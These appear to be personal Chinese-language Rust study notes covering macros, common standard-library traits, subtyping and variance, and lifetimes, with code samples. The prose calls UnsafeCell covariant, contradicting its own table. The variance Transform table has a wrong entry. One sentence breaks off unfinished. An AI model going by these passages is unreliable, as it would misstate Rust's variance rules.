<li><code>meta</code> ， 元信息，表示包含在#[... ]或#![…]属性内的信 息。</li>
<li><code>tt</code> , TokenTree 的缩写，指代词条树。</li>
<li><code>vis</code>，指代可见性，比如 pub 。</li>
<li><code>lifetime</code> ， 指代生命周期参数 。</li>
</ul>
<h3 id="重复匹配"><a class="header" href="#重复匹配">重复匹配</a></h3>
<p>对于需要重复匹配的情况，要使用<code>$( ... ) sep rep</code></p>
<ul>
<li><code>$</code> is a literal dollar token.</li>
<li><code>( ... )</code> is the paren-grouped pattern being repeated.</li>
<li><code>sep</code> is an <em>optional</em> separator token. Common examples are <code>,</code> and <code>;</code>.</li>
<li><code>rep</code> is the <em>required</em> repeat control. Currently, this can be <em>either</em> <code>*</code> (indicating zero or more repeats) or <code>+</code> (indicating one or more repeats). You cannot write &quot;zero or one&quot; or any other more specific counts or ranges.</li>
</ul>
<h3 id="注意"><a class="header" href="#注意">注意</a></h3>
<p>卫生性：在宏里如果使用非当前作用域内定义的变量，一定要使用绝对路径，并且变量必须在使用宏的任何地方都可见。</p>
<p>写完宏之后，加上<code>#[macro_export]</code>让他可以在外部使用。</p>
<h2 id="过程宏"><a class="header" href="#过程宏">过程宏</a></h2>
<blockquote>
<p>学习过程宏的过程：</p>
<ol>
<li>从 <a href="https://doc.rust-lang.org/book/ch19-06-macros.html">Rust Book: ch19-06-macros</a> 中知道过程宏的分类。</li>
<li>从 <a href="https://doc.rust-lang.org/nightly/reference/procedural-macros.html">Reference: procedural-macros</a> 中知道过程宏真正的编写框架。</li>
<li>从 <a href="https://github.com/dtolnay/syn/tree/master/examples">syn/examples</a> 中学习如何在特定任务下真实地编写过程宏。你对这四个例子理解地越仔细，那么你就能越快地上手过程宏。</li>
<li>最重要的资料是文档：<a href="https://docs.rs/quote/latest/quote/">quote</a> 和 <a href="https://docs.rs/syn/latest/syn/">syn</a> 。过程宏不像声明宏那样开箱即用，你需要引入别的库，所以你需要掌握这两个库。</li>
</ol>
</blockquote>
<p>我在Github上提供了一个例子，带上了详细的注释。由于目前的<strong>过程宏依然需要被单独放置到它们自己的包内</strong>（这个限制应该会在未来某个时候去除），所以工程的组织形式有点奇怪。</p>
<hr />
<div style="break-before: page; page-break-before: always;"></div><h1 id="trait"><a class="header" href="#trait">Trait</a></h1>
<h2 id="what-is-trait"><a class="header" href="#what-is-trait">What is Trait</a></h2>
<p>Trait中可以定义方法（还有类型），我们可以为类型impl某个Trait，也就是实现Trait中定义的东西。</p>
<p>所有的Trait中都有一个隐藏的类型Self，代表当前实现了这个Trait的具体类型。</p>
<blockquote>
<p>trait本身既不是具体类型，也不是指针类型。他只是定义了针对类型的、抽象的约束。不同的类型可以实现同一个trait，满足同一个trait的类型可以具有不同的大小。所以trait在编译阶段没有固定大小，被称为动态大小类型Dynamic Size Type。</p>
</blockquote>
<p>Trait也可以有集成关系。比如标准库里的<code>Ord</code>，就继承自<code>Eq</code>和<code>PartialOrd</code>。也就是说，为实现<code>Ord</code>的同时也必须实现<code>Eq</code>和<code>PartialOrd</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Ord: Eq + PartialOrd&lt;Self&gt; {
    fn cmp(&amp;self, other: &amp;Self) -&gt; Ordering;

    fn max(self, other: Self) -&gt; Self { ... }
    fn min(self, other: Self) -&gt; Self { ... }
    fn clamp(self, min: Self, max: Self) -&gt; Self { ... }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="orphan-rule"><a class="header" href="#orphan-rule">Orphan rule</a></h2>
<p>在声明和实现trait的时候，Rust规定了一个一致性规则，也被称为孤儿规则：<strong>impl块要么和trait的声明在同一个crate中，要么和类型的声明在同一个crate中</strong>。</p>
<p>如果不这样的话，确实让人有点迷惑。</p>
<h2 id="derive"><a class="header" href="#derive">Derive</a></h2>
<p>编译器可以帮我们自动实现某些Trait。</p>
<h2 id="trait-object"><a class="header" href="#trait-object">Trait Object</a></h2>
<p>我们有泛型可以帮我们实现静态的分派，有Trait帮我们实现动态的分派。</p>
<p>如果我们希望函数的参数可以是<strong>实现了某个Trait的所有类型</strong>，我们有两种写法</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn test&lt;T: XXX&gt;(arg: T) {
    todo!()
}
fn test(arg:dyn XXX ) {
    这样是不对的写法
}
fn test(arg: Box&lt;dyn XXX&gt;) {
    todo!()
}
<span class="boring">}
</span></code></pre></pre>
<p>第一种类似于模板，会为每个具体的T类型生成一份代码。效率高，但是二进制会膨胀。第二种是不正确的写法，因为<code>dyn XXX</code> 的大小不定，我们需要用Box把他包起来，这就是Trait Object。</p>
<p>实际上，指向Trait的指针都是trait object。dyn Trait是一个<strong>动态大小的类型DST</strong>。<code>&amp;dyn Trait</code>, <code>&amp;mut dyn Trait</code>, <code>Box&lt;dyn Trait&gt;</code>, <code>* const dyn Trait</code>, <code>Rc&lt;dyn Trait&gt;</code>等都是<strong>Trait object</strong>，因为dyn Trait是DST，所以这些指针也应该是fat pointer(携带了长度信息)。就现在来说，对DST的使用基本都是通过其指针完成的，比如函数参数就不能使DST。</p>
<p>另外，这个Trait中的方法第一个参数应该是self，如果不是的话，</p>
<h2 id="一些有用的trait"><a class="header" href="#一些有用的trait">一些有用的Trait</a></h2>
<h3 id="readwrite-1"><a class="header" href="#readwrite-1"><a href="https://doc.rust-lang.org/std/io/trait.Read.html">Read</a>/<a href="https://doc.rust-lang.org/std/io/trait.Write.html">Write</a></a></h3>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Read {
    fn read(&amp;mut self, buf: &amp;mut [u8]) -&gt; Result&lt;usize&gt;;

    fn read_vectored(&amp;mut self, bufs: &amp;mut [IoSliceMut&lt;'_&gt;]) -&gt; Result&lt;usize&gt; { ... }
    fn is_read_vectored(&amp;self) -&gt; bool { ... }
    unsafe fn initializer(&amp;self) -&gt; Initializer { ... }
    fn read_to_end(&amp;mut self, buf: &amp;mut Vec&lt;u8&gt;) -&gt; Result&lt;usize&gt; { ... }
    fn read_to_string(&amp;mut self, buf: &amp;mut String) -&gt; Result&lt;usize&gt; { ... }
    fn read_exact(&amp;mut self, buf: &amp;mut [u8]) -&gt; Result&lt;()&gt; { ... }
    fn by_ref(&amp;mut self) -&gt; &amp;mut Self
    where
        Self: Sized,
    { ... }
    fn bytes(self) -&gt; Bytes&lt;Self&gt;
    where
        Self: Sized,
    { ... }
    fn chain&lt;R: Read&gt;(self, next: R) -&gt; Chain&lt;Self, R&gt;
    where
        Self: Sized,
    { ... }
    fn take(self, limit: u64) -&gt; Take&lt;Self&gt;
    where
        Self: Sized,
    { ... }
}
pub trait Write {
    fn write(&amp;mut self, buf: &amp;[u8]) -&gt; Result&lt;usize&gt;;
    fn flush(&amp;mut self) -&gt; Result&lt;()&gt;;

    fn write_vectored(&amp;mut self, bufs: &amp;[IoSlice&lt;'_&gt;]) -&gt; Result&lt;usize&gt; { ... }
    fn is_write_vectored(&amp;self) -&gt; bool { ... }
    fn write_all(&amp;mut self, buf: &amp;[u8]) -&gt; Result&lt;()&gt; { ... }
    fn write_all_vectored(&amp;mut self, bufs: &amp;mut [IoSlice&lt;'_&gt;]) -&gt; Result&lt;()&gt; { ... }
    fn write_fmt(&amp;mut self, fmt: Arguments&lt;'_&gt;) -&gt; Result&lt;()&gt; { ... }
    fn by_ref(&amp;mut self) -&gt; &amp;mut Self
    where
        Self: Sized,
    { ... }
}
<span class="boring">}
</span></code></pre></pre>
<p>虽然上面列出了一大堆方法，但是除了<code>read</code>/<code>write</code>/<code>flush</code>以外都是有默认实现的。<code>Read</code>为<strong>读取字节流提供了一个抽象</strong>，<code>Write</code>为<strong>可写入字节流的东西提供了一个抽象</strong>。（Unix设计哲学 Everything is file, file is a byte of stream）</p>
<ul>
<li>read: Pull some bytes from this source into the specified buffer, returning how many bytes were read.</li>
<li>write: Write a buffer into this writer, returning how many bytes were written.</li>
<li>flush: Flush this output stream, ensuring that all intermediately buffered contents reach their destination.</li>
</ul>
<h3 id="stderrorerror"><a class="header" href="#stderrorerror"><a href="https://doc.rust-lang.org/std/error/trait.Error.html">std::error::Error</a></a></h3>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Error: Debug + Display {
    fn source(&amp;self) -&gt; Option&lt;&amp;(dyn Error + 'static)&gt; { ... }
    fn backtrace(&amp;self) -&gt; Option&lt;&amp;Backtrace&gt; { ... }
    fn description(&amp;self) -&gt; &amp;str { ... }
    fn cause(&amp;self) -&gt; Option&lt;&amp;dyn Error&gt; { ... }
}
<span class="boring">}
</span></code></pre></pre>
<p>如果你不想处理错误，想用<code>?</code>表达式直接一把梭，那就把返回值写成<code>Result&lt;(), Box&lt;dyn Error&gt;&gt;</code>，或者利用<code>Anyhow</code>这个第三方库。因为标准库所有的Error都是满足这个Trait的。当然，大工程不提倡这种鸵鸟做法，但小工程是写起来是真的爽。</p>
<h3 id="default"><a class="header" href="#default"><a href="https://doc.rust-lang.org/std/default/trait.Default.html">Default</a></a></h3>
<p>为某个结构提供默认值。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Default {
    fn default() -&gt; Self;
}
<span class="boring">}
</span></code></pre></pre>
<p>有什么用呢？在填充某些字段的时候可以用<code>default()</code>，很省事。不过这个特性还是nightly的。你需要打开开关并导入default。</p>
<pre><pre class="playground"><code class="language-rust">#![feature(default_free_fn)]
use std::default::default;

struct Fast {
    v: u8,
    max: u8,
}
impl Default for Fast {
    fn default() -&gt; Self {
        Fast {v: 1, max: 10 }
    }
}
fn main() {
    let f = Fast{v:2, ..default()};
    let mut f2 = Fast{..default()};
}
</code></pre></pre>
<h3 id="stdconvertfromstdconvertinto"><a class="header" href="#stdconvertfromstdconvertinto"><a href="https://doc.rust-lang.org/std/convert/trait.From.html">std::convert::From</a>/<a href="https://doc.rust-lang.org/std/convert/trait.Into.html">std::convert::Into</a></a></h3>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait From&lt;T&gt; {
    fn from(T) -&gt; Self;
}
pub trait Into&lt;T&gt; {
    fn into(self) -&gt; T;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>做类型转换</strong>。value to value，<code>AsRef</code>是reference to reference。是会消耗所有权的。<strong>实现了From，会自动实现Into</strong>，<code>From&lt;T&gt; for U</code> implies <code>Into&lt;U&gt; for T</code>，也就是说如果我们不应该去实现<code>Into</code>而是应该去实现<code>From</code>。</p>
<p>另外需要注意的是，这两个方法是不应该失败的。如果可能失败，有<a href="https://doc.rust-lang.org/std/convert/trait.TryFrom.html">TryFrom</a>/<a href="https://doc.rust-lang.org/std/convert/trait.TryInto.html">TryInto</a>。</p>
<p>这个Trait非常适合用来写泛型代码，为一系列类型做统一抽象。</p>
<pre><pre class="playground"><code class="language-rust">fn is_hello&lt;T: Into&lt;Vec&lt;u8&gt;&gt;&gt;(s: T) {
   let bytes = b&quot;hello&quot;.to_vec();
   assert_eq!(bytes, s.into());
}

fn main() {
    let s = &quot;hello&quot;.to_string();
    is_hello(s);
}
</code></pre></pre>
<h3 id="stdconvertasrefstdconvertasmut"><a class="header" href="#stdconvertasrefstdconvertasmut"><a href="https://doc.rust-lang.org/std/convert/trait.AsRef.html">std::convert::AsRef</a>/<a href="https://doc.rust-lang.org/std/convert/trait.AsMut.html">std::convert::AsMut</a></a></h3>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait AsRef&lt;T&gt; 
where
    T: ?Sized, 
{
    fn as_ref(&amp;self) -&gt; &amp;T;
}
pub trait AsMut&lt;T&gt; 
where
    T: ?Sized, 
{
    fn as_mut(&amp;mut self) -&gt; &amp;mut T;
}
<span class="boring">}
</span></code></pre></pre>
<p>这两个方法差不多。一个是把reference to reference, 一个是把mutable ref to mutable reference，<strong>做类型转换</strong>。需要注意的是，这种转换的<strong>代价必须是非常低</strong>的（人家以as打头，命名规范要求零开销）。如果说转换不是零开销的，那么我们可以考虑实现<code>impl From&lt;&amp;T&gt; for &amp;U</code>来实现引用类型的相互转换。</p>
<p>比如，我们看<code>Vec</code>的<code>AsRef&lt;T&gt;</code>实现，这是把<code>&amp;Vec&lt;T&gt;</code>转换成<code>&amp;[T]</code>。是零开销的。他们在内存里实际上是一个东西，都是一个长度+一个指针。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;T, A: Allocator&gt; AsRef&lt;[T]&gt; for Vec&lt;T, A&gt; {
    fn as_ref(&amp;self) -&gt; &amp;[T] {
        self
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>这个Trait也非常适合用来<strong>写泛型代码</strong>，为一系列类型做统一抽象。比如下面这个例子，他可以接受任何类型，只要能被转换成<code>&amp;[u8]</code>即可。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn iter_bytes&lt;T: AsRef&lt;[u8]&gt;&gt;(arg: T) {
    for i in arg.as_ref() {
        println!(&quot;{}&quot;,i);
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="stdborrowborrowstdborrowborrowmut"><a class="header" href="#stdborrowborrowstdborrowborrowmut"><a href="https://doc.rust-lang.org/std/borrow/trait.Borrow.html">std::borrow::Borrow</a>/<a href="https://doc.rust-lang.org/std/borrow/trait.BorrowMut.html">std::borrow::BorrowMut</a></a></h3>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Borrow&lt;Borrowed: ?Sized&gt; {
    fn borrow(&amp;self) -&gt; &amp;Borrowed;
}
<span class="boring">}
</span></code></pre></pre>
<p>这是一个泛型Trait。他做的事情很简单：实现这个trait的类，可以用过borrow方法将它的引用类型转换成其他的引用类型。举个例子，<code>&amp;String</code>类型就可以通过borrow方法变成<code>&amp;str</code>类型。看到这里，回顾一下<code>AsRef</code>，会发现他们不是<strong>长得</strong>一模一样吗？不过是泛型参数换了一个名字而已。不过他们并不是同一个意思，参考<a href="https://www.zhihu.com/question/470049587/answer/1984044384">AsRef、Deref和Borrow有哪些区别？ - Ad Infinitum的回答 - 知乎 </a>，当<code>T</code>实现<code>Borrow&lt;U&gt;</code>时，为<code>T</code>实现<code>Eq</code>, <code>Ord</code> and <code>Hash</code>的时候应与<code>U</code>的实现相同。<code>Borrow</code>常是用于一个类型的不同表示类型(如<code>Box&lt;T&gt;</code>, <code>Rc&lt;T&gt;</code>，<code>Cow&lt;T&gt;</code>)的引用到原类型(<code>T</code>)引用的转换。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl Borrow&lt;str&gt; for String {
    #[inline]
    fn borrow(&amp;self) -&gt; &amp;str {
        &amp;self[..]
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>这个Trait的用武之地，在于去<strong>写一个泛型函数</strong>，看文档中提供的例子。这里的<code>check</code>函数，接受的参数限制为 <strong>可以通过borrow方法转换成&amp;str</strong> 的任何类型。</p>
<pre><pre class="playground"><code class="language-rust">use std::borrow::Borrow;

fn check&lt;T: Borrow&lt;str&gt;&gt;(s: T) {
    assert_eq!(&quot;Hello&quot;, s.borrow());
}
fn main() {
    let s = &quot;Hello&quot;.to_string();
    check(s);

    let s = &quot;Hello&quot;;
    check(s);    
}
</code></pre></pre>
<p>另外，Rust为所有的<code>&amp;T</code>和<code>T</code>类型都实现了Borrow。完整的参考<a href="https://doc.rust-lang.org/std/borrow/trait.Borrow.html#implementors">文档</a>。</p>
<ul>
<li><code>T</code>的<code>borrow</code>参数类型就是<code>&amp;T</code>，返回自己即可，这是显而易见的。</li>
<li><code>&amp;T</code>的<code>borrow</code>参数类型是<code>&amp;&amp;T</code>，用两个<code>*</code>获得<code>T</code>，再返回<code>&amp;T</code>。</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;T: ?Sized&gt; const Borrow&lt;T&gt; for T {
    fn borrow(&amp;self) -&gt; &amp;T {
        self
    }
}
impl&lt;T: ?Sized&gt; const Borrow&lt;T&gt; for &amp;T {
    fn borrow(&amp;self) -&gt; &amp;T {
        &amp;**self
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>BorrowMut和Borrow是类似的，不过是从<code>&amp;T</code>变成<code>&amp;mut T</code>。</p>
<h3 id="derefderefmut"><a class="header" href="#derefderefmut">Deref/DerefMut</a></h3>
<p>解引用操作可以被自定义。</p>
<p>Rust提供自动解引用机制，所以我们操作智能指针非常的舒服，就像操作普通的指针一样。</p>
<h3 id="stdopsdrop"><a class="header" href="#stdopsdrop"><a href="https://doc.rust-lang.org/std/ops/trait.Drop.html">std::ops::Drop</a></a></h3>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Drop {
    #[stable(feature = &quot;rust1&quot;, since = &quot;1.0.0&quot;)]
    fn drop(&amp;mut self);
}
<span class="boring">}
</span></code></pre></pre>
<p>类似于C++的析构函数。当拥有所有权的变量结束了生命周期，就会调用。通过这个Trait的实现，让我们可以利用Rust的所有权机制更好的实现资源的管理。在大多数情况下我们不需要自己去实现<code>Drop</code>，因为如果我们自定义了一个<code>struct</code>，他会在释放的时候自动去调用每一个字段的<code>drop</code>函数。</p>
<p>可以用<code>forget</code>主动跳过析构函数。</p>
<h3 id="clonecopy"><a class="header" href="#clonecopy">Clone/Copy</a></h3>
<p><code>Copy</code>和<code>Clone</code>好像是一个意思？其实<code>Copy</code>只是一个标记，如果一个类实现了<code>Copy</code>，那么<strong>编译器认为可以通过简单的内存复制（C语言的<code>memcpy</code>）实现该类型的复制，不会产生任何的内存安全问题。一旦一个类型实现了Copy，那么在变量绑定，函数参数传递，函数返回值传递等场景下，都是copy语义，不再是默认的move语义</strong>。只有我们类中每一个字段都实现了<code>Copy</code>，才可以实现<code>Copy</code>，<code>#[derive(Copy)]</code>即可，他只是一个标记。</p>
<p>顾名思义<code>Clone</code>就是克隆一份一样的。如果我们的类中每个字段都实现了<code>Clone</code>，就可以让编译器<code>#[derive(Clone)]</code>。我们也可以自己实现<code>Clone</code>。但是实现的时候要注意：</p>
<ol>
<li>对于实现了Copy的类型，那么他的Clone方法应该和copy语义相容，等于按字节复制。遵守这个规则的最好办法就是<code>#[derive(Copy, Clone)]</code>。</li>
<li><code>clone</code>方法用于按语义的复制。比如Rc类型的clone就是将引用计数+1。</li>
</ol>
<h3 id="hash-3"><a class="header" href="#hash-3">Hash</a></h3>
<h3 id="ordeqpartialordpartialeq"><a class="header" href="#ordeqpartialordpartialeq">Ord/Eq/PartialOrd/PartialEq</a></h3>
<h3 id="stdmarkersized"><a class="header" href="#stdmarkersized"><a href="https://doc.rust-lang.org/std/marker/trait.Sized.html">std::marker::Sized</a></a></h3>
<p>实现是空，是一个标记。实现了这个Trait类型，表示编译期有固定的大小。一般来说，这都是编译器自动隐式实现的，我们不用自己去为我们的类型实现Sized。</p>
<p>需要注意的是，当我们写一个泛型参数的时候，比如<code>struct Foo&lt;T&gt;</code>，实际上默认是<code>struct Foo&lt;T: Sized&gt;</code>。编译器会默认泛型参数<code>T</code>满足<code>Sized</code>。如果我们不希望这样，需要特别写出<code>struct Foo&lt;T: ?Sized&gt;</code>，表示<code>T</code>是否实现<code>Sized</code>都无所谓。</p>
<p>不过在trait中的<code>Self</code>类型（也就是实现这个trait的类型），是默认<code>Self: ?Sized</code>的。并且如果我们用<code>Sized</code>去约束了Self，那么就无法实例化trait object。这是显然的，trait object在运行时刻才知道他具体是哪个类型，才知道他的大小。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Foo where Self: Sized {
    fn foo(&amp;self)
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="从类型系统看生命周期"><a class="header" href="#从类型系统看生命周期">从类型系统看生命周期</a></h1>
<h2 id="subtyping"><a class="header" href="#subtyping">Subtyping</a></h2>
<p>Subtyping is a relationship between types that allows statically typed languages to be a bit more flexible and permissive.</p>
<p>在一个强类型的语言中，要求用类型A的地方只能用类型A是正常情况。例如，<code>let a: i32 = 4i16;</code>这个看起来很自然的赋值语句因为两边的类型不一样是不会编译通过的。但是，为了增加灵活性，我们引入了Subtyping。</p>
<p>Subtyping好像很好理解，不就是子类型吗，OOP语言中的继承就是一个很好的例子。不过，根据里氏替换原则（Liskov Substitution Principle，LSP），我们应该这么理解子类型：<strong>如果在任何要求类型U的地方都能用类型T的值替换，我们可以认为T是U的子类型</strong>。</p>
<p>Rust的Subtyping和其他的语言不太一样，一个很显然的，Rust的类(struct)没有继承。Rust中的Subtyping主要是用在泛型和Trait，还有生命周期（你也可以当做是泛型吧）。</p>
<h2 id="covariance"><a class="header" href="#covariance">Covariance</a></h2>
<ul>
<li><code>Covariance</code>：使你能够使用原始指定类型的<strong>子类型</strong>，协变。</li>
<li><code>Contravariance</code>：使你能够使用原始指定类型的<strong>父类型</strong>，逆变。</li>
<li><code>Invariance</code>：表示只能使用最初指定的类型，不变。</li>
</ul>
<p>通俗的理解，他们描述的是：<strong>在某个场景我要求使用类型A，那么类型A的子类型/父类型能否使用呢</strong>？能使用A的子类型就是Covariance，能使用A的父类型就是Contravariance，只能使用类型A就是Invariance。</p>
<p>其实，更数学和严谨的说法，我们可以把“场景”，当做一个type constructor(类型构造器)，记做<code>F</code>。回忆上面提到的里氏替换原则，sub是可以替换super的，如果<code>F&lt;T&gt;</code>协变，说明<code>F&lt;sub&gt;</code>是<code>F&lt;super&gt;</code>的子类型，所以<code>F&lt;sub&gt;</code>能替换<code>F&lt;super&gt;</code>，也就是说我们能在F场景下使用指定类型的子类型。</p>
<ul>
<li><code>F&lt;T&gt;</code> is covariant if <code>F&lt;sub&gt;</code> is a subtype of <code>F&lt;super&gt;</code>.</li>
<li><code>F&lt;T&gt;</code> is contra-variant if <code>F&lt;super&gt;</code> is a sub type of <code>F&lt;sub&gt;</code>.</li>
<li><code>F&lt;T&gt;</code> is invariant otherwise.</li>
<li>如果<code>F</code>有多个类型参数，我们针对单个类型参数讨论。例如可以说<code>F&lt;T,U&gt;</code>对<code>T</code>是不变的，对<code>U</code>是协变的。</li>
</ul>
<p>下面是Rust常用的变形表。From <a href="https://doc.rust-lang.org/nomicon/subtyping.html">Rustonomicon</a>。虽然列出了挺多，但是逻辑是统一的：</p>
<ul>
<li>不可变引用<code>&amp;T</code>,<code>*const T</code>是协变的，<code>Box&lt;T&gt;</code>这个具有所有权引用的容器是协变的。</li>
<li>可变引用<code>&amp;mut T</code>,<code>*mut T</code>,是不变的，<code>UnsafeCell</code>这个具有内部可变性的容器是协变的（其他具有内部可变性的容器，内部都使用了<code>UnsafeCell</code>，他是受编译器特殊照顾的）</li>
<li>唯一逆变的是函数参数是逆变的，函数参数中的生命周期也是逆变的。</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th></th><th></th><th>'a</th><th>T</th><th>U</th></tr></thead><tbody>
<tr><td>*</td><td><code>&amp;'a T</code></td><td>covariant</td><td>covariant</td><td></td></tr>
<tr><td>*</td><td><code>&amp;'a mut T</code></td><td>covariant</td><td>invariant</td><td></td></tr>
<tr><td>*</td><td><code>Box&lt;T&gt;</code></td><td></td><td>covariant</td><td></td></tr>
<tr><td></td><td><code>Vec&lt;T&gt;</code></td><td></td><td>covariant</td><td></td></tr>
<tr><td>*</td><td><code>UnsafeCell&lt;T&gt;</code></td><td></td><td>invariant</td><td></td></tr>
<tr><td></td><td><code>Cell&lt;T&gt;</code></td><td></td><td>invariant</td><td></td></tr>
<tr><td>*</td><td><code>fn(T) -&gt; U</code></td><td></td><td><strong>contra</strong>variant</td><td>covariant</td></tr>
<tr><td></td><td><code>*const T</code></td><td></td><td>covariant</td><td></td></tr>
<tr><td></td><td><code>*mut T</code></td><td></td><td>invariant</td><td></td></tr>
</tbody></table>
</div>
<h2 id="variance-arithmetic"><a class="header" href="#variance-arithmetic">Variance arithmetic</a></h2>
<p>最后一个问题，那么我们在自定义数据类型中的类型转换应该是什么样的呢？例如</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct A&lt;T&gt; {
    a: T,
    b: Cell&lt;T&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<p>组合变型有两种数学运算：<strong>Transform</strong> 和最大下确界（greatest lower bound, <strong>GLB</strong> ）。Transform 用于类型组合，而 GLB 用于所有的聚合体：结构体、元组、枚举以及联合体。让我们分别用 0、+、和 - 来表示不变，协变和逆变。然后 Transform（X）和 GLB（^）可以用下面两张表来表示：</p>
<div class="table-wrapper"><table><thead><tr><th>x</th><th>0</th><th>+</th><th>-</th></tr></thead><tbody>
<tr><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>+</td><td>0</td><td>+</td><td>-</td></tr>
<tr><td>-</td><td>0</td><td>0</td><td>+</td></tr>
</tbody></table>
</div><div class="table-wrapper"><table><thead><tr><th>^</th><th>0</th><th>+</th><th>-</th></tr></thead><tbody>
<tr><td>0</td><td>0</td><td>0</td><td>0</td></tr>
<tr><td>+</td><td>0</td><td>+</td><td>0</td></tr>
<tr><td>-</td><td>0</td><td>0</td><td>-</td></tr>
</tbody></table>
</div>
<p>回到上面那个例子，显然这个是GLB的情况，里面有<code>Cell&lt;T&gt;</code>不变，那么整个结构体就是不变了。</p>
<h2 id="lifetime"><a class="header" href="#lifetime">Lifetime</a></h2>
<p>介绍了半天的类型系统，我们终于要开始介绍生命周期了。</p>
<p>Rust中一个和其他语言都不同的概念是生命周期。Rust 中的<strong>每一个引用</strong>都有其<strong>生命周期</strong>（lifetime），也就是引用保持有效的作用域。（这也意味着，不是引用的话，就没有生命周期这个概念）</p>
<p>生命周期虽然不是类型，但是在Rust中我们可以把生命周期当做类型处理：<strong>长的生命周期是短的生命周期的子类型</strong>。当我们用类型转换的方法去理解生命周期，一切就显得自然了起来。举例一个经典的例子：</p>
<pre><pre class="playground"><code class="language-rust">fn the_longest&lt;'a&gt;(s1: &amp;'a str, s2: &amp;'a str) -&gt; &amp;'a str
{
    if s1.len() &gt; s2.len() {s1} else {s2}
}

fn main() {
    let s1 = String::from(&quot;hello&quot;);
    let s2 = String::from(&quot;hi&quot;);
    let ret = the_longest(&amp;s1, &amp;s2);
    println!(&quot;{}&quot;, ret);
}
</code></pre></pre>
<p>那么我们从类型系统的角度如何理解这一段代码？<code>&lt;'a&gt;</code>是一个生命周期标记，我们把他当做一个泛型，编译器会试图找一个满足约束的生命周期。</p>
<p><code>&amp;s1</code>的生命周期是从line7-line10（忽略非词法生命周期non-lexical lifetimes）记做<code>'a1</code>，<code>&amp;s2</code>的生命周期是从line8-line10，记做<code>'a2</code>。函数参数要求是逆变的，所以<code>'a</code>会取最小的生命周期（也就是父类型）<code>'a2</code>。编译器检查返回值的生命周期是<code>'a2</code>，是否满足条件。</p>
<p>下面是一个不会通过编译的代码，From <a href="https://doc.rust-lang.org/nomicon/subtyping.html">Rustonomicon</a>。</p>
<pre><pre class="playground"><code class="language-rust">fn evil_feeder&lt;T&gt;(input: &amp;mut T, val: T) {
    *input = val;
}

fn main() {
    let mut mr_snuggles: &amp;'static str = &quot;meow! :3&quot;;  // mr. snuggles forever!!
    {
        let spike = String::from(&quot;bark! &gt;:V&quot;);
        let spike_str: &amp;str = &amp;spike;                // Only lives for the block
        evil_feeder(&amp;mut mr_snuggles, spike_str);    // EVIL!
    }
    println!(&quot;{}&quot;, mr_snuggles);                     // Use after free?
}
</code></pre></pre>
<p><code>&amp;mut mr_snuggles</code>的类型是<code>&amp;'l6_l12 mut &amp;'static str</code>。这个类型组合有点绕。<code>spike_str</code>的类型是<code>&amp;'l8_l12 str</code>。</p>
<p>我们把这两个参数传给<code>evil_feeder</code>。<code>&amp;mut T</code>要求是不变的，所以T只能是<code>'static str</code>。而函数是逆变的，我们取最小的生命周期，T又要求是<code>'l8_l12</code>，这就矛盾了。</p>
<p>再来看一个例子，例子来自于<a href="https://doc.rust-lang.org/nomicon/lifetime-mismatch.html">The Rustonomicon</a>，下面这段代码也是无法通过编译器检查的。</p>
<pre><pre class="playground"><code class="language-rust">#[derive(Debug)]
struct Foo;

impl Foo {
    fn mutate_and_share(&amp;mut self) -&gt; &amp;Self { &amp;*self }
    fn share(&amp;self) {}
}

fn main() {
    let mut foo = Foo;
    let loan = foo.mutate_and_share();
    foo.share();
    println!(&quot;{:?}&quot;, loan);
}
</code></pre></pre>
<p>load虽然使用了一个<code>&amp;mut</code>但是返回的是<code>&amp;</code> ，按直觉来说的话，两个shared ref是可以共存的，也就是说我们可以调用<code>foo.share()</code>。但事实上Rust会提示我们有问题。<code>mutate_and_share</code>传入了<code>&amp;mut self</code>，返回<code>&amp;self</code>，那么返回值<code>load</code>的生命周期比传入的参数的生命周期大（返回值的生命周期参数是传入参数的子类型），所以我们在调用<code>foo.share()</code>的时候希望在获得一个不变引用，但是还有一个可变引用活着，就无法通过编译器的检查。</p>
<h2 id="省略生命周期参数"><a class="header" href="#省略生命周期参数">省略生命周期参数</a></h2>
<p>生命周期参数可以省略。称为lifetime elision rules。以下就是省略的生命周期被自动补全的规则。<strong>这是自动补全，不是推理</strong>。这个规则是默认的，因为大部分情况都是这样的，但是不一定是你想要的，可以手动的修改他。</p>
